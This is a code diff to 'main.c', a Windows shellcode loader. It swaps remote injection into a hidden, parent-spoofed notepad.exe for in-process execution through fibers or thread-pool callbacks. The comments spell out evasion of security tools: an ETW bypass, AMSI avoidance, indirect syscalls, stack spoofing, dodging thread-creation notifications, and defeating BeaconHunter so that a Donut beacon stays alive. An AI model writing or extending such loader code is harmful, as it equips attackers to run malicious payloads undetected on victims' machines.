@@ -2,8 +2,8 @@
 // main.c - Shellcode Loader
 //
 // Evasion:  Patchless ETW (VEH + HW breakpoints)
-// Memory:   NtAllocateVirtualMemory
-// Thread:   Thread pool callback (TpAllocWork/TpPostWork)
+// Memory:   NtAllocateVirtualMemory (in-process)
+// Exec:     Poison Fiber (primary) / TP callback (fallback)
 // Stack:    Call gadget injection + tail-call spoofing
 // Syscalls: Indirect with randomized gadget pool
 // Crypto:   Chaskey-CTR (replaces RC4/SystemFunction032)
@@ -140,38 +140,31 @@ int Main(VOID) {
     }
 
     // ============================================================
-    // Evasion cleanup — wipe VEH handler + debug registers
-    // from this (loader) process before injection.
+    // Evasion cleanup — remove VEH handler + clear debug registers
     // ============================================================
     CleanupEvasion(&WinApis);
     LOG("[+] Evasion cleanup complete");
 
     // ============================================================
-    // Injection: PPID-spoofed notepad.exe + section mapping
+    // Execute shellcode in the current process.
     //
-    // Spawns notepad.exe hidden, parented to explorer.exe so
-    // the process tree looks user-initiated. notepad.exe does
-    // NOT register with AMSI (no AmsiInitialize call), avoiding
-    // the AMSI_PATCH_T.B12 detection that fires in powershell.exe
-    // when injected shellcode (Donut) patches AmsiScanBuffer.
+    // Primary path: Poison Fiber
+    //   ConvertThreadToFiber + CreateFiber(SpoofCallback) + SwitchToFiber
+    //   No new OS thread — PsSetCreateThreadNotifyRoutine never fires.
     //
-    // Shellcode is placed via NtCreateSection + NtMapViewOfSection:
-    //   - VAD in target shows Mapped (pagefile-backed), not MEM_PRIVATE
-    //   - No NtAllocateVirtualMemory + NtProtectVirtualMemory pair
-    //   - Primary thread kept SUSPENDED: no window, process stays alive
-    //     as long as the Donut shellcode thread holds its beacon loop.
-    //
-    // Self-terminates the loader after injection.
+    // Fallback path: NT thread pool
+    //   TpAllocWork(SpoofCallback) + TpPostWork
+    //   Main thread waits alertable on NtCurrentProcess pseudo-handle
+    //   (Wait:UserRequest, not Wait:DelayExecution — defeats BeaconHunter).
     // ============================================================
-    LOG("[*] Injecting into remote process...");
-    if (!InjectIntoProcess(&NtApis, pShellcode, dwShellcodeSize)) {
+    LOG("[*] Executing shellcode in current process...");
+    if (!ExecuteInProcess(&NtApis, &WinApis, pShellcode, dwShellcodeSize)) {
         MemSet(pShellcode, 0, dwShellcodeSize);
         HeapFree(GetProcessHeap(), 0, pShellcode);
         return 0;
     }
 
-    // InjectIntoProcess calls NtTerminateProcess(-1) on success.
-    // Reached only if self-terminate failed — wipe and exit cleanly.
+    // Wipe the heap copy — shellcode is now running from its own allocation.
     MemSet(pShellcode, 0, dwShellcodeSize);
     HeapFree(GetProcessHeap(), 0, pShellcode);
     return 0;
